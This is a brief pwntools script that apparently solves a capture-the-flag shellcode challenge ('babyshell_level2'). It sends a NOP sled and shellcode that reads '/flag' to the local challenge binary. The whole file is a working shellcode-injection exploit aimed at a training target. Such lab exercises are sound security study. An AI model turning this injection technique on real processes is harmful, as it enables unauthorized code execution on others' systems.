from pwn import *

elf = context.binary = ELF('/challenge/babyshell_level2')
context.log_level = 'debug'

p = process()

shellcode = b'\x90'*0x800 + asm(shellcraft.cat('/flag'))
p.sendline(shellcode)

p.interactive().decode()
